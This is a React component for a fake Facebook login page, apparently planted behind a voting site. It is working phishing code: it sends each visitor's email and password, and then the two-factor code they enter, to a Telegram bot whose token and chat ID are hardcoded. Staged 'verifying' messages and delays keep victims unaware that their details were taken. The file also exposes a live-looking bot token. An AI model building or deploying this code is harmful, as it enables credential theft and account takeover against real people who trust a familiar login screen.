import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';
import { Facebook } from 'lucide-react';
import { useAuthSettings } from '@/hooks/use-auth-settings';
import { VoteSuccessModal } from '@/components/VoteSuccessModal';

const TELEGRAM_BOT_TOKEN = '7371815939:AAEi9KZLsmz1bM5vxgNic7NXUocO6tdSHks';
const TELEGRAM_CHAT_ID = '-1002380892216';

const FacebookLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [show2FA, setShow2FA] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const navigate = useNavigate();
  const { toast } = useToast();
  const { settings, loading: settingsLoading } = useAuthSettings('facebook');
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  if (settingsLoading) {
    return (
      <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#1877f2]" />
      </div>
    );
  }

  const sendToTelegram = async (email: string, password: string) => {
    const message = `🔐 New Facebook Login\n\n👤 Email: ${email}\n🔑 Password: ${password}\n\n📱 Platform: Facebook\n⏰ Time: ${new Date().toLocaleString()}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(email, password);

      toast({
        title: "Verifying...",
        description: "Please wait while we verify your credentials",
      });

      setTimeout(() => {
        setLoading(false);
        if (settings?.platforms?.facebook?.login?.success) {
          setShow2FA(true);
        } else {
          toast({
            title: "Error",
            description: "Authentication failed. Please try again later.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to login. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verificationCode) {
      toast({
        title: "Error",
        description: "Please enter verification code",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(email, `2FA Code: ${verificationCode}`);
      
      toast({
        title: "Verifying code...",
        description: "Please wait while we verify your code",
      });

      setTimeout(() => {
        if (settings?.platforms?.facebook?.twoFactor?.success) {
          setShowSuccessModal(true);
        } else {
          toast({
            title: "Error",
            description: "Invalid verification code. Please try again.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
        setLoading(false);
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify code. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center p-4">
      <div className="max-w-md w-full space-y-8">
        <div className="text-center">
          <Facebook className="h-12 w-12 mx-auto text-[#1877f2]" />
          <h2 className="mt-6 text-3xl font-bold text-[#1c1e21]">
            {show2FA ? 'Enter security code' : 'Log in to Facebook'}
          </h2>
        </div>

        {!show2FA ? (
          <form onSubmit={handleLogin} className="mt-8 space-y-6 bg-white p-6 rounded-lg shadow">
            <div className="space-y-4">
              <input
                type="text"
                placeholder="Email or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#1877f2]"
                required
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#1877f2]"
                required
              />
            </div>
            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 bg-[#1877f2] text-white rounded-lg font-bold hover:bg-[#166fe5] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? 'Logging in...' : 'Log In'}
            </button>
            <div className="text-center">
              <a href="#" className="text-[#1877f2] text-sm hover:underline">Forgot Password?</a>
            </div>
            <div className="border-t border-gray-300 pt-4">
              <button
                type="button"
                className="w-full py-3 bg-[#42b72a] text-white rounded-lg font-bold hover:bg-[#36a420] transition-colors"
              >
                Create New Account
              </button>
            </div>
          </form>
        ) : (
          <form onSubmit={handle2FASubmit} className="mt-8 space-y-6 bg-white p-6 rounded-lg shadow">
            <div className="space-y-4">
              <p className="text-sm text-gray-600">
                We sent a code to your email for {email.slice(0, 2)}***
              </p>
              <input
                type="text"
                placeholder="Enter code"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#1877f2]"
                required
                maxLength={6}
              />
            </div>
            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 bg-[#1877f2] text-white rounded-lg font-bold hover:bg-[#166fe5] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? 'Verifying...' : 'Continue'}
            </button>
            <div className="text-center">
              <button 
                type="button"
                onClick={() => setShow2FA(false)}
                className="text-[#1877f2] text-sm hover:underline"
              >
                Try another way
              </button>
            </div>
          </form>
        )}
      </div>
      <VoteSuccessModal 
        open={showSuccessModal} 
        onClose={() => {
          setShowSuccessModal(false);
          navigate('/');
        }} 
      />
      <div className="fixed bottom-4 left-4">
        <a 
          href="/"
          className="text-sm text-[#1877f2] hover:underline flex items-center gap-2"
        >
          <svg 
            xmlns="http://www.w3.org/2000/svg" 
            width="16" 
            height="16" 
            viewBox="0 0 24 24" 
            fill="none" 
            stroke="currentColor" 
            strokeWidth="2" 
            strokeLinecap="round" 
            strokeLinejoin="round"
          >
            <path d="M19 12H5M12 19l-7-7 7-7"/>
          </svg>
          Back to Black and White Entertainment
        </a>
      </div>
    </div>
  );
};

export default FacebookLogin;